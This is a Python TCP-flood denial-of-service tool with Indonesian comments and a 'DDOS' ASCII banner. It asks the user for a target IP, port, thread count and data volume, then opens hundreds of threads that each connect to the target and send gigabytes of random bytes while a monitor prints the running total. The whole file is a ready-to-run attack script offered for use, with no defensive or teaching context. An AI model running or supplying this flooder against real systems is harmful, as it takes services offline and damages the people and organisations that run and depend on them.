import socket
import threading
import random
import time
import os

# Fungsi untuk meng-clear terminal (opsional)
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

clear()

# Banner ASCII Neraka
print("""

                                                    
                              ,----..               
    ,---,        ,---,       /   /   \   .--.--.    
  .'  .' `\    .'  .' `\    /   .     : /  /    '.  
,---.'     \ ,---.'     \  .   /   ;.  \  :  /`. /  
|   |  .`\  ||   |  .`\  |.   ;   /  ` ;  |  |--`   
:   : |  '  |:   : |  '  |;   |  ; \ ; |  :  ;_     
|   ' '  ;  :|   ' '  ;  :|   :  | ; | '\  \    `.  
'   | ;  .  |'   | ;  .  |.   |  ' ' ' : `----.   \ 
|   | :  |  '|   | :  |  ''   ;  \; /  | __ \  \  | 
'   : | /  ; '   : | /  ;  \   \  ',  / /  /`--'  / 
|   | '` ,/  |   | '` ,/    ;   :    / '--'.     /  
;   :  .'    ;   :  .'       \   \ .'    `--'---'   
|   ,.'      |   ,.'          `---`                 
'---'        '---'                                  
                                                    

""")

# Desain Input yang Lebih Menarik
print("\033[1;36m[+] \033[0mMasukkan informasi untuk serangan DDoS:")

# Input untuk Target IP
target_ip = input("\033[1;33m┌───────────────────────────────────┐\n│ \033[1;32mIP Target \033[1;33m    : \033[1;34m")  
# Input untuk Target Port
target_port = int(input("\033[1;33m└───────────────────────────────────┘\n┌───────────────────────────────────┐\n│ \033[1;32mPort Target \033[1;33m  : \033[1;34m"))
# Input untuk Jumlah Threads
threads = int(input("\033[1;33m└───────────────────────────────────┘\n┌───────────────────────────────────┐\n│ \033[1;32mJumlah Threads \033[1;33m(misal 800) : \033[1;34m"))
# Input untuk Jumlah Total Data
total_paket = int(input("\033[1;33m└───────────────────────────────────┘\n┌───────────────────────────────────┐\n│ \033[1;32mJumlah Total Data \033[1;33m(misal 800 untuk 800GB) : \033[1;34m"))
ukuran_paket = 1024 * 1024 * 1024  # 1 GB per paket (1GB = 1024 MB = 1024*1024 KB)

# Total terkirim
total_terkirim = 0
lock = threading.Lock()

# Fungsi untuk menyerang server dengan TCP
def attack_tcp():
    global total_terkirim
    paket_data = random._urandom(4096)  # 4KB per packet, nanti total akan jadi 1GB

    for i in range(total_paket // threads):  # Pembagian paket antara thread
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))  # Koneksi ke server
            terkirim = 0

            # Kirim 1GB data (mencapai ukuran_paket)
            while terkirim < ukuran_paket:
                s.send(paket_data)  # Kirim data kecil
                terkirim += len(paket_data)  # Menghitung total data terkirim

                with lock:
                    total_terkirim += len(paket_data)

            print(f"\033[1;32m[+] \033[0mPaket 1GB terkirim ke {target_ip}:{target_port}")
            s.close()

        except Exception as e:
            print(f"\033[1;31m[-] \033[0mError: {e}")
            time.sleep(1)  # Coba lagi setelah 1 detik jika terjadi error

# Jalankan threads
for _ in range(threads):
    t = threading.Thread(target=attack_tcp)
    t.start()

# Monitoring (untuk menghitung total data terkirim)
def monitor():
    while True:
        time.sleep(5)  # Menunggu selama 5 detik sebelum menampilkan status
        with lock:
            terkirim_gb = total_terkirim / (1024**3)  # Total data terkirim dalam GB
        print(f"\033[1;36m[=] \033[0mTotal Data Terkirim: {terkirim_gb:.2f} GB")

monitor_thread = threading.Thread(target=monitor)
monitor_thread.daemon = True
monitor_thread.start()
